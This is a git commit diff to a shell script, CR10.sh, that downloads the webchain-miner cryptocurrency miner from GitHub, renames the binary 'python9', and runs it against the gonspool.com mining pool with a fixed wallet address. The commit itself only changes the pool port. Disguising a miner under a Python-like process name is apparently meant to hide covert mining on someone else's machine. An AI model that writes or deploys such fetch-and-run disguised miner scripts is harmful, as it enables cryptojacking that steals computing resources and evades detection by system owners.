6e38e2aa70d4c0ca366c6694242a1b0753fc208d
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-05-17 10:16:23 +0700

    Update CR10.sh

--- CR10.sh
+++ CR10.sh
@@ -30,6 +30,6 @@ wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0
 tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
 mv webchain-miner python9
 rm config.json
-./python9 -o web-ko1.gonspool.com:3332 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python9 -o web-ko1.gonspool.com:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
